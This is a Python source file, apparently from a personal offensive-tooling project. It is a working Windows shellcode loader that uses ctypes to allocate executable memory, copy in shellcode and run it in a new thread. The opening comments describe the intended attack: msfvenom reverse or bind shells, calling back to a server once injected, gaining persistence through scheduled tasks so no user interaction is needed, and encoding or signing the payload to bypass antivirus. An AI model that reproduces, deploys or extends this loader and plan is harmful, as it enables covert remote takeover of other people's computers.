
# get the shellcode using this file and execute it in memory
# then check the injection using spsi_S.py file
# after all thses if the shellcdoe is a reverse shell use trutle folder files to control the attack
# NOTE: build your payload.py using pyinjector which contains shellcode(msfvenom to create the shellcode of reverse/bind shell tcp) using ctypes lib 
''' NOTE: paste your shellcode in here to inject it using ctypes lib into target memory and control it again with this file using socket-programming
		  if successfully injected then send a message to server and tell that shellcode has been injected or smt like this 
		  use windows schedule to run this file without user interact or make it persistence
		  bypass AV(encode shellcode or digital signature for virus.exe)'''

#!/usr/bin/python
import ctypes

# put ur shellcode here...
shellcode = ""
# need to code the input into the right format through string escape
shellcode = shellcode.decode("string_escape")
# convert to bytearray
shellcode = bytearray(shellcode)
# Reserves or commits a region of pages in the virtual address space of the calling process.
# use types windll.kernel32 for virtualalloc reserves region of pages in virtual addres sspace
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))
# use virtuallock to lock region for physical address space
ctypes.windll.kernel32.VirtualLock(ctypes.c_int(ptr),
                                   ctypes.c_int(len(shellcode)))
# read in the buffer
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
# The RtlMoveMemory routine copies the contents of a source memory block to a destination
# memory block, and supports overlapping source and destination memory blocks.
# moved the memory in 4 byte blocks
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                     buf,
                                     ctypes.c_int(len(shellcode)))
# Creates a thread to execute within the virtual address space of the calling process
# launch in a thread 
ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_int(ptr),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0)))
# Waits until the specified object is in the signaled state or the time-out interval elapses.
# waitfor singleobject
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
